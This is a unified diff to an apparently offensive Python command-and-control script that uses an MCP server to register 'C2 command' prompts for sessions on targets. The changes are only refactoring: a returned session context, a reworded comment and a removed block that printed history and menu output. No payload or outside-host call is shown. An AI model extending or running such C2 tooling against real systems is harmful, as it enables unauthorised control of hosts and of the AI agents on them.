@@ -72,6 +72,7 @@ def system_prompt(ip: int, port: int, tokenizer: AutoTokenizer, model_path: str,
     )
 
     main_thread.start()
+    return session_context
 
 @MCP_SERVER.prompt()
 def interact(session_id: str) -> str:
@@ -118,7 +119,7 @@ def main():
         print("Base model already exists, skipping download")
 
     tokenizer = AutoTokenizer.from_pretrained(str(model_path), local_files_only=True)
-    system_prompt(ip, port, tokenizer, str(model_path))
+    session_context = system_prompt(ip, port, tokenizer, str(model_path))
 
     while True:
         if len(SESSIONS) == 0:
@@ -155,7 +156,7 @@ def main():
                 session_id = next(sid in user_command for sid in SESSIONS)
                 _ = interact(session_id)
 
-            # Re-print prompt if user doesn't type anything
+            # Skip to next loop iteration if user doesn't type anything
             if not user_command:
                 continue
             
@@ -178,19 +179,6 @@ def main():
             
             # Register the prompt with MCP (triggers event and overwrites if exists)
             MCP_SERVER.add_prompt(c2_command_prompt)
-            
-            # Provide hook for integration with agent responses
-            # TODO: move this to an event handler function so we can continue interacting with the current target
-            print(f"\n[*] Prompt updated for session {SELECTED_SESSION}")
-            print("[*] Conversation history:")
-            for i, msg in enumerate(session_context.get_session_history(SELECTED_SESSION)):
-                role = msg["role"].upper()
-                content_preview = msg["content"][:80] + "..." if len(msg["content"]) > 80 else msg["content"]
-                print(f"    {i+1}. [{role}] {content_preview}")
-            print("\n[*] Options:")
-            print("    1. Add agent response - session_context.add_agent_response(session_id, 'response text')")
-            print("    2. Clear session history - session_context.clear_session(session_id)")
-            print("    3. Continue to next command...\n")
 
 if __name__ == '__main__':
     main()
